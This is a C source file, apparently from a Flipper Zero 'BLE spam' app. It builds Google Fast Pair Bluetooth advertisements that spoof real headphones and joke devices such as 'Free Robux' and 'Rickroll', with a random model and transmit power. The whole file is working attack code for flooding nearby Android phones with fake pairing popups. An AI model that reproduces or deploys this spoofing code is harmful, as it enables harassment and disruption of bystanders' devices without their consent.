#include "fastpair.h"
#include "_registry.h"

// Hacked together by @Willy-JL and @Spooks4576
// Documentation at https://developers.google.com/nearby/fast-pair/specifications/introduction

const char* fastpair_get_name(const BleSpamProtocolCfg* _cfg) {
    const FastpairCfg* cfg = &_cfg->fastpair;
    UNUSED(cfg);
    return "FastPair";
}

void fastpair_make_packet(uint8_t* _size, uint8_t** _packet, const BleSpamProtocolCfg* _cfg) {
    const FastpairCfg* cfg = _cfg ? &_cfg->fastpair : NULL;

    uint32_t model_id;
    if(cfg && cfg->model_id != 0x000000) {
        model_id = cfg->model_id;
    } else {
        const uint32_t models[] = {
            // Genuine devices
            0xCD8256, // Bose NC 700
            0xF52494, // JBL Buds Pro
            0x718FA4, // JBL Live 300TWS
            0x821F66, // JBL Flip 6
            0x92BBBD, // Pixel Buds
            0xD446A7, // Sony XM5

            // Custom debug popups
            0xD99CA1, // Flipper Zero
            0x77FF67, // Free Robux
            0xAA187F, // Free VBucks
            0xDCE9EA, // Rickroll
            0x87B25F, // Animated Rickroll
            0xF38C02, // Boykisser
            0x1448C9, // BLM
            0xD5AB33, // Xtreme
            0x13B39D, // Talking Sasquach
            0xAA1FE1, // ClownMaster
        };
        model_id = models[rand() % COUNT_OF(models)];
    }

    uint8_t size = 14;
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = 3; // Size
    packet[i++] = 0x03; // AD Type (Service UUID List)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...

    packet[i++] = 6; // Size
    packet[i++] = 0x16; // AD Type (Service Data)
    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
    packet[i++] = 0xFE; // ...
    packet[i++] = (model_id >> 0x10) & 0xFF; // Model ID
    packet[i++] = (model_id >> 0x08) & 0xFF; // ...
    packet[i++] = (model_id >> 0x00) & 0xFF; // ...

    packet[i++] = 2; // Size
    packet[i++] = 0x0A; // AD Type (Tx Power Level)
    packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm

    *_size = size;
    *_packet = packet;
}

const BleSpamProtocol ble_spam_protocol_fastpair = {
    .icon = &I_android,
    .get_name = fastpair_get_name,
    .make_packet = fastpair_make_packet,
};
